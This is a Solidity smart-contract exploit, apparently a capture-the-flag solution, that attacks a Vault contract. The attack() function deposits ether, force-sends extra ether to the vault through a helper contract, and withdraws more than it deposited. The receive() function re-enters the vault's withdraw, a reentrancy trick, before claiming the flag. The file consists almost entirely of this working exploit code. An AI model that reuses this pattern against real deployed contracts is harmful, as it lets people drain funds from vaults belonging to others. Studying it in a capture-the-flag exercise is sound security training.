pragma solidity ^0.8;

import "./Vault.sol";
import "./ForceSendEther.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Depositor is Ownable {
    address payable public immutable vault;
    bool flag;

    constructor(address payable vault_) {
        vault = vault_;
    }

    receive() external payable {
        if (msg.sender != vault || flag) {
            return;
        }

        flag = true;
        Vault v = Vault(vault);
        v.withdraw(0, address(this), address(this));
    }

    function attack() external onlyOwner {
        require(address(this).balance >= 2 ether, "moar eth");

        // deposit ETH
        Vault v = Vault(vault);
        v.deposit{value: 1 ether}(1 ether, address(this));

        // force send ETH to vault
        ForceSendEther fse = new ForceSendEther();
        fse.forceSend{value: 1 ether}(vault);

        // withdraw ETH with excess
        v.withdraw(1 ether, address(this), address(this));

        // CTF
        v.captureTheFlag(msg.sender);
    }
}
